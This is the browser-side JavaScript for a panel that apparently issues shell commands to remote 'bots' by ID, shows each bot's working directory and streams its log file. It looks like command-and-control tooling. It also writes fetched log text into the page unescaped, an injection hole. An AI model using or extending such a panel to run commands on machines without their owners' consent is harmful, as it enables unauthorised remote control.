let timerInterval;
let countdown = 30; // Refresh timer, seconds
let offset = 0; // "Load More" offset
let refreshOffset = 0; // Refresh only most recent lines
const linesPerPage = 50; // Number of lines to fetch per request

function formatLogsWithLineNumbers(logs, startingLineNumber = 1) {
    // Add line numbers to file!
    const lines = logs.split('\n');
    const formattedLines = lines.map((line, index) => {
        if (line.trim() === '') return ''; // Skip empty lines
        const lineNumber = startingLineNumber + index;
        return `<div class="log-line">
                <span class="line-number">${lineNumber}</span>
                <span class="line-content">${line}</span>
            </div>`;
    });
    return formattedLines.join('');
}

// Function to fetch the current working directory
async function fetchCWD() {
    const cwdDisplay = document.getElementById("cwd-display");
    const botId = document.getElementById("client-id").value;
    if (!botId) {
        showNotification(`Not bot selected.`, 'error');
        cwdDisplay.textContent = "No bot selected $";
        return;
    }

    try {
        const response = await fetch(`/api/cwd?bot_id=${botId}`);
        if (response.ok) {
            const data = await response.json();
            cwdDisplay.textContent = `${data.cwd} $`;
        } else {
            showNotification(`Failed to get current directory : ${response.status} - ${response.statusText}.`, 'error');
            console.error("Failed to fetch CWD");
            cwdDisplay.textContent = "Error retrieving CWD $";
        }
    } catch (error) {
        showNotification(`Could not get current directory ${error}.`, 'error');
        console.error("Error fetching CWD:", error);
        cwdDisplay.textContent = "Error retrieving CWD $";
    }
}

// Event listener for DOMContentLoaded
document.addEventListener("DOMContentLoaded", () => {
    const shellInput = document.getElementById("shell-input");
    const sendShellCommandButton = document.getElementById("send-shell-command");
    const cwdDisplay = document.getElementById("cwd-display");

    // Function to send a shell command
    async function sendShellCommand() {
        const command = shellInput.value.trim();
        if (!command) return;

        const botId = document.getElementById("client-id").value;
        if (!botId) {
            showNotification('Please enter a bot ID.', 'error');
            return;
        }

        // Split the command into program and parameters
        const commandParts = command.split(" ");
        const program = commandParts[0]; // First word is the program
        const params = commandParts.slice(1); // Remaining words are parameters

        const payload = {
            bot_ids: botId, // Use "bot_ids" to match the server's expected parameter
            cmd_id: "0",
            program: program,
            params: params.join(" "), // Send params as a space-separated string
            delay: 0,
            expected_code: 0,
        };

        try {
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded', // Use URL-encoded format
                },
                body: new URLSearchParams(payload).toString(), // Convert payload to URL-encoded string
            });

            if (response.ok) {
                console.log("Command sent successfully");
                shellInput.value = ""; // Clear the input

                // Refresh the live log file
                fetchBotLogs(botId, false, true);

                // Refresh the CWD
                await fetchCWD();
            } else {
                showNotification('Failed to send command.', 'error');
                console.error("Failed to send command");
            }
        } catch (error) {
            showNotification(`Error sending command ${error}.`, 'error');
            console.error("Error sending command:", error);
        }
    }

    // Add click event to the "Send" button
    sendShellCommandButton.addEventListener("click", sendShellCommand);

    // Map the Enter key to send the command
    shellInput.addEventListener("keydown", (event) => {
        if (event.key === "Enter") {
            event.preventDefault(); // Prevent form submission or default behavior
            sendShellCommand();
        }
    });
});

// Function to fetch bot logs
async function fetchBotLogs(botId, prepend = false, isRefresh = false) {
    const fileContentElement = document.getElementById('file-content');

    try {
        // Use the appropriate offset for refresh or load more
        const currentOffset = isRefresh ? refreshOffset : offset;
        const response = await fetch(`/api/botfile?id=${botId}&lines=${linesPerPage}&offset=${currentOffset}`);
        if (response.ok) {
            const data = await response.json(); // Parse the JSON response

            if (data.lines && Array.isArray(data.lines)) {
                const logs = data.lines.join('\n'); // Combine the lines into a single string

                if (logs.length <= 0) {
                    showNotification('No lines fetched. Bot may be offline or empty file.', 'error');
                }

                if (prepend) {
                    // Calculate the starting line number for prepended lines
                    const startingLineNumber = offset - linesPerPage + 1;
                    // Prepend new lines to the top
                    fileContentElement.innerHTML =
                        formatLogsWithLineNumbers(logs, startingLineNumber) + fileContentElement.innerHTML;
                } else if (isRefresh) {
                    // Replace only the most recent lines during refresh
                    const preservedContent = Array.from(fileContentElement.querySelectorAll('.log-line'))
                        .slice(0, -linesPerPage)
                        .map(line => line.outerHTML)
                        .join('');
                    const existingLines = fileContentElement.querySelectorAll('.log-line').length;
                    fileContentElement.innerHTML =
                        preservedContent + formatLogsWithLineNumbers(logs, existingLines - linesPerPage + 1);
                } else {
                    // Replace content for initial load
                    fileContentElement.innerHTML = formatLogsWithLineNumbers(logs, 1);
                }
            } else {
                showNotification('No logs found in the response.', 'error');
                fileContentElement.textContent = 'No logs found.';
            }
        } else {
            const error = await response.json();
            showNotification(`Error getting logs: ${error.error}.`, 'error');
            fileContentElement.textContent = `Error: ${error.error}`;
        }
    } catch (err) {
        showNotification(`Failed to fetch bot logs: ${err.message}.`, 'error');
        fileContentElement.textContent = `Error: Failed to fetch bot logs. ${err.message}`;
    }
}

// Function to start the timer
function startTimer(botId) {
    const timerElement = document.getElementById('timer');
    countdown = 30; // Reset countdown

    clearInterval(timerInterval); // Clear any existing timer
    timerInterval = setInterval(() => {
        countdown--;
        timerElement.textContent = countdown;

        if (countdown <= 0) {
            clearInterval(timerInterval);
            fetchBotLogs(botId, false, true); // Refresh the most recent lines
            startTimer(botId); // Restart the timer
        }
    }, 1000);
}

// Function to get query parameters from the URL
function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

// Function to set the bot ID in the hidden input field
function setBotId(botId) {
    const clientIdInput = document.getElementById('client-id'); // Hidden input for bot_id
    if (clientIdInput) {
        clientIdInput.value = botId;
    }
}

// On page load, fetch the last `linesPerPage` lines, start the timer, and fetch the CWD
window.onload = async () => {
    const botId = getQueryParam('id');
    if (botId) {
        setBotId(botId); // Populate the hidden input field with the bot ID
        offset = 0; // Reset offset for "Load More"
        refreshOffset = 0; // Reset offset for refresh
        fetchBotLogs(botId); // Fetch the logs for the specified bot ID
        startTimer(botId); // Start the timer for regular updates
        fetchCWD(); // Fetch the current working directory
    } else {
        showNotification('No bot ID was provided', 'error');
        document.getElementById('file-content').textContent = 'Error: No bot ID provided in the URL.';
        document.getElementById('cwd-display').textContent = 'No bot selected $';
    }
};

// Event listener for the "Load Client" button
document.getElementById('load-client').addEventListener('click', () => {
    const clientId = document.getElementById('client-id').value.trim();
    if (clientId) {
        setBotId(clientId); // Update the hidden input field with the new bot ID
        offset = 0; // New line n° offset
        refreshOffset = 0; // New line n° offset
        fetchBotLogs(clientId); // Get file data
        startTimer(clientId); // Auto-update file content
    } else {
        showNotification('Please enter a valid Client ID.', 'error');
    }
});

// Event listener for the "Refresh Now" button
document.getElementById('force-refresh').addEventListener('click', () => {
    forcerefresh();
});

function forcerefresh() {
    const botId = getQueryParam('id') || document.getElementById('client-id').value.trim();
    if (botId) {
        setBotId(botId); // Ensure the hidden input field is updated
        fetchBotLogs(botId, false, true); // Refresh the most recent lines
        countdown = 30; // Reset the countdown
    } else {
        showNotification('Please enter a valid Bot ID.', 'error');
    }
}

// Event listener for the "Load More" button
document.getElementById('load-more').addEventListener('click', async () => {
    const botId = getQueryParam('id') || document.getElementById('client-id').value.trim();
    if (botId) {
        setBotId(botId); // Ensure the hidden input field is updated
        offset += linesPerPage; // Increase the offset for "Load More"
        fetchBotLogs(botId, true); // Fetch more lines and prepend
        await new Promise(r => setTimeout(r, 1)); // For some reason, we need to wait for just a little (1ms)
        forcerefresh(); // Allows to reset the line numbers :)
    } else {
        showNotification('Please enter a valid Bot ID.', 'error');
    }
});

// On page load, fetch the last `linesPerPage` lines, start the timer, and fetch the CWD
window.onload = () => {
    const botId = getQueryParam('id');
    if (botId) {
        setBotId(botId); // Populate the hidden input field with the bot ID
        offset = 0; // Reset offset for "Load More"
        refreshOffset = 0; // Reset offset for refresh
        fetchBotLogs(botId); // Fetch the logs for the specified bot ID
        startTimer(botId); // Start the timer for regular updates
        fetchCWD(); // Fetch the current working directory
    } else {
        document.getElementById('file-content').textContent = 'Error: No bot ID provided in the URL.';
        document.getElementById('cwd-display').textContent = 'No bot selected $';
    }
};